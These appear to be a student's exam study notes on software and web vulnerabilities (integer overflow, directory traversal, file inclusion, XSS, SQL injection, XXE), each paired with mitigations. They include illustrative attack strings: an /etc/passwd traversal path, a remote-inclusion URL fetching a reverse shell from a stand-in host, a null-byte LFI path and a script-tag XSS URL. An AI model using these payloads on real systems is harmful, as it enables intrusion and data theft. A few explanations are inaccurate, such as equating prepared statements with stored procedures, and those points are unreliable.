# Integer overflow

- A very simple concept - much simpler than stack buffer overflows
- But also much easier to do accidentally within code
- Everything that you store in memory is stored in limited, pre-allocated space
- For a number, it's gonna have to have certain boundaries depending on the exact type
- Those boundaries are minimum and maximum values the number can be
- What happens if you store the maximum value and then increment it by 1?

![8-bit-integer-binary.png](img/8-bit-integer-binary.png)

- This is the smallest amount of memory that can be allocated: 1 byte (or 8 bits)
- To convert any position from binary to decimal, raise 2 to the power of the corresponding position
- To calculate the decimal from the binary, multiply the decimal equivalent of each position by what's stored at that position in binary, then add everything up:

$128 \times 1 + 64 \times 1 + 32 \times 0 + 16 \times 1 + 8 \times 1 + 4 \times 0 + 2 \times 0 + 1 \times 1 = 217$  

- A number represented as 1 byte can range from 0000000 (0 in decimal) to 11111111 (255 in decimal)
- So if someone tries to add 1 to this, we don't have enough bits to represent such a number, which means we need an extra bit of storage and we end up with a 9-bit number.
	- Keep in mind that a binary representation of 256 is 100000000
	- So the 8 bits we do have become all zeros
	- And the 1 that's added on the left is ignored by the system
	- And as a result we have 0, which is not what we're trying to get by going $255 + 1$
- What if we try to have a sign for positive/negative numbers? This is called a **`signed int`**
	- The left-most bit (aka the most significant bit) gains a special meaning
	- It's no longer used to represent integers
	- Instead, it defines a mathematical sign: 1 is negative, 0 is positive
	- Now we only have 7 bits that can hold a numerical value
	- The minimum is now 10000000 or -128, the maximum is now 01111111 or 127
	- Since $01111111 + 00000001 = 10000000$, that means $127 + 1 = -128$ since the left-most bit is reserved for the sign. Again, NOT a result we would expect!

### So what's the impact?

- Integer overflows are not as bad as buffer overflows because they don't create an opportunity for code injection
- But they can crash an application, bring it to an unpredictable state, or corrupt a database
- Usually it's a DoS condition, or a loss of availability - we don't want this

### Mitigation

- Decide what number boundaries your app will need - this depends on its purpose
	- If it's something scientific where very long numbers are needed, your app must be able to handle it
- In your code, always use number types that can accommodate the necessary number length
- Have boundary checks that will prevent an overflow
- Input validation, as always
- Consider every case in which a user can bring a number that was first within boundaries to a state where it's out of boundaries - again, have checks in place

---

# Web app vulnerabilities and attacks

- The vast majority of web apps, if not all of them, rely on interaction with the user via **user input**
	- Search fields, comments, login forms, etc.
- User input is the source of all evil!

### Directory traversal

- The `../` attack
- Malicious actor uses the address bar and attempts to view files and folders that shouldn't be visible on the same machine as the web server
	- `../../../../../etc/passwd` - if successful, they now have a list of users and their privileges
	- If they can access `/etc/shadow`, they can attempt dumping credentials from there and cracking password hashes
- Stems from application misconfiguration and lack of security in the address bar
- Mitigation:
	- Can be detected by a WAF
	- Disallow `../` and all of its obfuscated/encoded derivatives in the address bar
	- Disallow directory access from query strings
	- Route things in such a way as to throw a 404 whenever a page isn't accessed **from** another specific page
	- Make sure the app and its users have no permissions to access anything outside of the app

### File inclusion

- Uploading external files into a web app without permission
- Tricking the app into downloading malicious content
- Two types:
	- **Remote File Inclusion (RFI)**
		- `page.php?q=http://malware.com/rev-shell.php`
		- Including something from an external resource and making the app run it
	- **Local File Inclusion (LFI)**
		- `page.php?document=../../temp/shell.sh%00`
		- Including something (like a document or a font) that's already on the server and making the app run it
		- Requires a directory traversal vuln
		- The `%00` is a null byte that attempts to bypass the app's file extension checks
- Mitigation:
	- Disable remote inclusion (`allow_url_include` set to 0 in PHP)
	- Make a whitelist if remote inclusion is necessary - everything else is disallowed
	- Disable `allow_url_fopen` to control the ability to open/include/use a remote file
	- Use preset conditions as an alternative to filenames when file inclusion is based on user input
	- Track where a request for inclusion comes from, satisfy those requests only based on certain conditions

### XSS

- Cross-site scripting
- Targeting a user's browser for the purpose of tricking it into executing arbitrary code that's not prescribed by the site/app user is visiting
- Most likely it's JS code
- Different types:
	- **Reflected XSS**: getting the user to click a link with malicious code (it can be embedded right there in the link - with all sorts of encoding/obfuscation)
	- **Stored XSS**: the malicious code somehow gets persisted in the victim app, particularly in its database. No need for a link, the code will fire every time a user goes to a page that pulls data that includes injected code
	- **DOM-based XSS**: occurs within a database maintained by the user's web browser, therefore never seen by the remote web server because it happens on the user's computer entirely
		- Delivered via the URL such as `www.example.com/welcome?user=<script>malicious_code_here</script>`
		- If the web app directly inserts the `user` parameter value into the page's DOM without properly validating/encoding it, the malicious script will be executed by the browser
- Can be directed towards admin functionality in an app
- It's a dangerous attack because JS is a powerful language, and code can be written to pursue a variety of malicious goals: stealing credentials, scanning a network, compromise a machine, even set up remote access
- Mitigation:
	- Sanitize user input from all those text areas, don't let your users send you executable code
	- WAF solutions catch these types of attacks
	- IDPS solutions for layer 7
	- Whitelist approach to input sanitization - just specify which characters are allowed
	- Dedicated modules in Apache, IIS, and other web server solutions
	- Keep server/clients updated
	- Output encoding, which means encoding user data before inserting it into the HTML document, especially for "dangerous" symbols such as `<` and `>`. For instance, you might replace `<` with `&lt;`, `>` with `&gt;`, etc.
	- Content Security Policy restricting execution of scripts, which will prevent inline scripts and limit scripts in general to those from trusted sources
	- Use the DOM and `document` API safely
	- Regular code review and vuln scanning

### SQL Injection

- An attempt to directly interact with the app's backend database by crafting special payloads in the form of SQL statements
- Relies on user input to hide these queries
- Undesired effect: accessing confidential info that can be used for further compromise attempts, changing/corrupting/erasing data
- Mitigation:
	- Sanitizing input! Users shouldn't be able to send executable SQL code to the app
	- Don't sanitize on the client side
	- WAF, database firewalls
	- Use prepared statements (aka stored procedures) , add parameters later - these parameters, even if containing illegal stuff, will not actually be treated as SQL code since the original query has already been put together

### Insecure object references

- The app manages access to its internal resources (database, code, etc) based on user permissions
- There's always stuff on the back end that should be hidden from everybody but the owner/developers of the app
- Allowing your code to expose sensitive stuff like that is a bad thing
- Attackers can use it to mess with the app's behaviour
- For instance, embedding the price of an item in a URL - the attacker can catch the request and change the price to what they think is fair
- Mitigation:
	- Training developers on best practices
	- Designing apps securely
	- Never assume your users will take the same steps as you're planning for them to take
		- Is there any way to circumvent the process? Think of every scenario
	- Ensure authentication and authorization are always there - users should only be able to access what they're allowed to access. Always check if a user is authenticated
	- Locking mechanisms - checking for permissions

### XML attacks

- XML is considered static by many people
- Don't forget that it's used in order to serialize data for communication between different apps
- That includes passing around authentication and authorization info
- If it's used to send sensitive information, it should always be encrypted in transit
- XML is structured, and this structure is necessary for parsing XML
- This parsing process is what's targeted for attacks
	- DoS ("billion laughs attack" based on expanding XML entities)
	- XXE (XML eXternal Entity) - embedding a request to a local resource in an XML file, i.e. referring to local files on the parser's side. This relies on the fact that your own XML entities can be defined before sending the XML over to a different app, and those entities can request external resources.
		- Normally uses a URL, but attackers can use the `"file:///path/to/file"` structure
- Mitigation:
	- Validate
	- Validate some more
	- Sanitize
	- Have I mentioned validating?

---

### Exam

Know ideas behind all of the above attacks, be able to recognize them, know how to mitigate them.